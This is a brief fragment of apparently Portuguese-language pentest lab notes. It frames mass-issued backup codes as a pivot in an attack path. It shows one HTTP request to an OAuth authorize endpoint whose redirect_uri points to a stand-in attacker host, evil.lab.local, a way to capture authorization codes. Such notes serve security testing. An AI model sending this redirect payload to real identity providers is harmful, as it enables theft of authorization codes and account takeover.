...
aliases: ["backup codes em massa", "backup-codes", "backup-codes-path"]
---

# backup codes em massa — path

backup codes em massa como pivô. Path curto > monte de finding isolado.
...
```http
GET /oauth/authorize?client_id=APP_LAB&redirect_uri=https://evil.lab.local/cb&response_type=code&state=7580b4 HTTP/1.1
Host: idp.lab.local
